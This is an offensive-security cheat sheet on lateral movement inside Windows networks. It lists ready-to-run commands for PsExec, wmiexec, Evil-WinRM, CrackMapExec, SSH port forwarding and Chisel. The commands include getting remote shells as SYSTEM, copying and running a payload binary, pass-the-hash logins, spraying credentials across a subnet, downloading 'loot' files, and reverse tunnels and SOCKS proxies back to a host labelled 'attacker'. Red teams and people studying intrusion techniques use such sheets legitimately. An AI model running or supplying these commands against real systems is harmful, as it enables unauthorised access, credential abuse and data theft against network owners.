Lateral Movement

ToolDescription
PsExecExecute commands on remote Windows hosts
---- Common -----
[Interactive shell] — psexec \\<IP> -u user -p password cmd.exe
[Impacket variant] — psexec.py domain/user:pass@<IP>
---- Options -----
[Run as SYSTEM] — psexec \\<IP> -s cmd.exe
[Copy & run binary] — psexec \\<IP> -c payload.exe
[Pass the hash] — psexec.py -hashes <LM:NT> domain/user@<IP>
WMIExecUse WMI for remote command execution
---- Common -----
[Semi-interactive shell] — wmiexec.py domain/user:pass@<IP>
[Pass the hash] — wmiexec.py -hashes <LM:NT> domain/user@<IP>
---- Options -----
[Run single command] — wmiexec.py domain/user:pass@<IP> "whoami /all"
[Blind / no output] — wmiexec.py -nooutput domain/user:pass@<IP>
Evil-WinRMWinRM shell used for lateral movement
---- Common -----
[Connect] — evil-winrm -i <IP> -u user -p password
[Pass the hash] — evil-winrm -i <IP> -u user -H <HASH>
---- Options -----
[Load PowerShell scripts] — evil-winrm -i <IP> -u user -p password -s /path/scripts/
[Load executables] — evil-winrm -i <IP> -u user -p password -e /path/exes/
---- File transfer -----
[Upload] — upload local.txt C:\Windows\Temp\local.txt
[Download] — download C:\Windows\Temp\loot.txt local.txt
CrackMapExecSpray creds and pivot across hosts
---- Common -----
[Scan subnet] — crackmapexec smb 10.0.0.0/24 -u user -p password
[Pass the hash] — crackmapexec smb <IP> -u user -H <HASH>
---- Pivot -----
[Execute across subnet] — crackmapexec smb 10.0.0.0/24 -u user -p password -x whoami
[Find local-admin access] — crackmapexec smb 10.0.0.0/24 -u user -p password --local-auth
SSH tunnelingForward ports and pivot through SSH
---- Common -----
[Local port forward] — ssh -L 8080:internal:80 user@jumpbox
[Remote port forward] — ssh -R 4444:127.0.0.1:4444 user@jumpbox
[Dynamic (SOCKS proxy)] — ssh -D 1080 user@jumpbox
---- Options -----
[Background, no shell] — ssh -fN -L 8080:internal:80 user@jumpbox
[SSH with key] — ssh -i key.pem -L 8080:internal:80 user@jumpbox
[Route through SOCKS] — proxychains curl http://internal
ChiselTCP tunneling and reverse proxies
---- Common -----
[Start server] — chisel server -p 8000 --reverse
[Reverse tunnel client] — chisel client attacker:8000 R:8080:internal:80
---- Modes -----
[Forward proxy client] — chisel client attacker:8000 8080:internal:80
[SOCKS5 proxy] — chisel client attacker:8000 R:socks
---- Options -----
[Authenticated server] — chisel server -p 8000 --auth user:pass --reverse
[Fingerprint pinning] — chisel client --fingerprint <FP> attacker:8000 R:socks
